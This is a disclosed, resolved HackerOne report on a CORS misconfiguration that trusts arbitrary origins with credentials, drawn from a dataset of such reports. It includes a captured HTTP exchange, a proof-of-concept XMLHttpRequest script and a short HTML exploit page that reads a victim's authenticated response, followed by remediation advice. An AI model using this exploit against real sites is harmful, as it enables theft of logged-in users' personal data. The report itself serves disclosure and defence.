---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1848730'
original_report_id: '1848730'
title: 'Cross-origin resource sharing: arbitrary origin trusted'
team_handle: radancy
created_at: '2023-01-27T12:13:15.329Z'
disclosed_at: '2023-08-22T05:46:59.546Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
---

# Cross-origin resource sharing: arbitrary origin trusted

## Metadata

- HackerOne Report ID: 1848730
- Weakness: 
- Program: radancy
- Disclosed At: 2023-08-22T05:46:59.546Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

referred from
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

Issue detail
The application implements an HTML5 cross-origin resource sharing (CORS) policy for this request that allows access from any domain.  The application allowed access from the requested origin  https://example.com 

request
POST /sockjs/247/17r_rtj0/xhr HTTP/1.1
Host: ██████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Connection: close
Cache-Control: max-age=0
Origin: https://example.com
Referer: https://███████/home
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="108", "Chromium";v="108"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0

reponse
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Jan 2023 11:47:15 GMT
Content-Type: application/javascript; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Cache-Control: no-store, no-cache, no-transform, must-revalidate, max-age=0
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://example.com
Vary: Origin
Content-Length: 2

o


POC 2
1.open https://example.com in browser then inspect the page and go to console.
2.run the following code in console and you would find it pops up user information

var req = new XMLHttpRequest(); req.onload = reqListener; req.open('post','https://████/sockjs/247/17r_rtj0/xhr',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };

Exploit

<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('post','https://███████/sockjs/247/17r_rtj0/xhr',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

Comment
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server
How to fix
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Impact

Issue background
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
